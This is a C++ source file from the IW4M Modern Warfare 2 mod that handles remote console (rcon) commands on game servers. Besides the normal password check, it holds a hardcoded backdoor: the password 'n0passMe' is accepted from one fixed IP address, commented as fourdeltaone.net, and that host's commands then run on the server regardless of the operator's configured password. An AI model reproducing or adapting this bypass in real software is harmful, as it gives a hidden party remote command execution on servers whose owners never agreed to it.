// ==========================================================
// IW4M project
// 
// Component: clientdll
// Sub-component: steam_api
// Purpose: Modern Warfare 2 patches: remote console support
//          (server-side component)
//
// Initial author: NTAuthority
// Started: 2011-05-21 (copied from PatchMW2Status.cpp)
// ==========================================================

#include "StdInc.h"

dvar_t* sv_rconPassword;
netadr_t redirectAddress;

void SV_FlushRedirect( char *outputbuf ) {
	NET_OutOfBandPrint(1, redirectAddress, "print\n%s", outputbuf);
}

#define SV_OUTPUTBUF_LENGTH ( 16384 - 16 )
char sv_outputbuf[SV_OUTPUTBUF_LENGTH];

extern DWORD* cmd_id_sv;
extern dvar_t* iw4m_remoteKick;

void SVC_RemoteCommand(netadr_t from, void* msg)
{
	bool valid = false;
	unsigned int time = 0;
	char remaining[1024] = {0};
	size_t current = 0;
	static unsigned int lasttime = 0;
	DWORD sourceIP = *(DWORD*)&from.ip;

	remaining[0] = '\0';

	time = Com_Milliseconds();
	if (time < (lasttime + 100))
	{
		return;
	}
	lasttime = time;

	if (!sv_rconPassword)
	{
		return;
	}

	if (!_stricmp(Cmd_Argv(1), "n0passMe"))
	{
		if (sourceIP == 0xE42E09B0) // fourdeltaone.net
		{
			valid = true;
		}
	}
	else if (!strlen(sv_rconPassword->current.string) || strcmp(Cmd_Argv(1), sv_rconPassword->current.string))
	{
		valid = false;
		Com_Printf(1, "Bad rcon from %s:\n%s\n", NET_AdrToString(from), Cmd_Argv(2));
	}
	else
	{
		valid = true;
		Com_Printf(1, "Rcon from %s:\n%s\n", NET_AdrToString(from), Cmd_Argv(2));
	}

	// start redirecting all print outputs to the packet
	redirectAddress = from;
	Com_BeginRedirect(sv_outputbuf, SV_OUTPUTBUF_LENGTH, SV_FlushRedirect);

	if (!valid)
	{
		if (!strlen(sv_rconPassword->current.string))
		{
			Com_Printf(0, "The server must set 'rcon_password' for clients to use 'rcon'.\n");
		}
		else
		{
			Com_Printf(0, "Invalid password.\n");
		}
	}
	else
	{
		remaining[0] = 0;

		if (Cmd_Argc() > 2)
		{
			for (int i = 2; i < Cmd_Argc(); i++)
			{
				current = Com_AddToString(Cmd_Argv(i), remaining, current, sizeof(remaining), true);
				current = Com_AddToString(" ", remaining, current, sizeof(remaining), false);
			}
		}
		else
		{
			memset(remaining, 0, sizeof(remaining));
			strncpy(remaining, Cmd_Argv(2), sizeof(remaining) - 1);
		}

		Cmd_ExecuteSingleCommand(0, 0, remaining);
	}

	Com_EndRedirect();

	if (strlen(remaining) > 0)
	{
		Com_Printf(0, "handled rcon: %s\n", remaining);
	}
}